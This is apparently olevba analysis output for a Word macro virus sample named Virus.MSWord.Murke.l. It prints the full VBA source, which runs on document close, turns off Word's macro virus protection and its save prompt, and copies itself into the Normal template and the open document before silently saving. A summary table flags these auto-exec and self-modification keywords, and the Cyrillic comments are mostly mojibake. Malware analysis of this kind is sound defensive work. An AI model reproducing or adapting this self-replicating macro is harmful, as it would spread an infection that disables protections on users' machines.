olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Murke.l
Type: Text
-------------------------------------------------------------------------------
VBA MACRO ./Virus.MSWord.Murke.l 
in file: ./Virus.MSWord.Murke.l - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Close()
'Rashit25.05.02 11:59:46Epson LX-850+ on LPT1:�����. 06-2-121
'Murka - ��� ����� ��������� �� ���� ��������� ����������������� �������!
'Rashit25.05.02 11:59:46Epson LX-850+ on LPT1:�����. 06-2-121
'                 ��������������� ���������� �������
'Rashit25.05.02 11:59:46Epson LX-850+ on LPT1:�����. 06-2-121
'������� ���������������: Freeware(��������)
'Rashit25.05.02 11:59:46Epson LX-850+ on LPT1:�����. 06-2-121
'����������:              ���� �� �����
'Rashit25.05.02 11:59:46Epson LX-850+ on LPT1:�����. 06-2-121
'"��� ���, �������, ������, �� � �� ����� �� �����, ��� ���
'Rashit25.05.02 11:59:46Epson LX-850+ on LPT1:�����. 06-2-121
'��� MustDie ��� ��� ��������!
'Rashit25.05.02 11:59:46Epson LX-850+ on LPT1:�����. 06-2-121
'�����. ��� ��� ���������� ������������ ������ Murka.
'Rashit25.05.02 11:59:46Epson LX-850+ on LPT1:�����. 06-2-121
'������:   mustdie@chat.ru
'Rashit25.05.02 11:59:46Epson LX-850+ on LPT1:�����. 06-2-121
'��������: antivir@dials.ru
'Rashit25.05.02 11:59:46Epson LX-850+ on LPT1:�����. 06-2-121
On Error Resume Next
'Rashit25.05.02 11:59:46Epson LX-850+ on LPT1:�����. 06-2-121
Dim t As Object
Dim i As Long
Dim Murka As String
  s = ActiveDocument.Saved
  Application.EnableCancelKey = wdCancelDisabled
  With Options: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
  'ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines
  i = MacroContainer.VBProject.VBComponents.Item(1).codemodule.CountOfLines
  Murka = MacroContainer.VBProject.VBComponents.Item(1).codemodule.Lines(1, i)
  If NormalTemplate.VBProject.VBComponents.Item(1).codemodule.Lines(1, i) <> Murka Then
    Set t = NormalTemplate.VBProject.VBComponents.Item(1)
  ElseIf ActiveDocument.VBProject.VBComponents.Item(1).codemodule.Lines(1, i) <> Murka Then
    Set t = ActiveDocument.VBProject.VBComponents.Item(1)
  Else
    t = Nothing
  End If
  If TypeName(t) <> "Nothing" Then
    t.codemodule.InsertLines 1, Murka
    Randomize
    If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Murka": .Author = "M&M": .Execute: End With
    If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
  End If
  If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

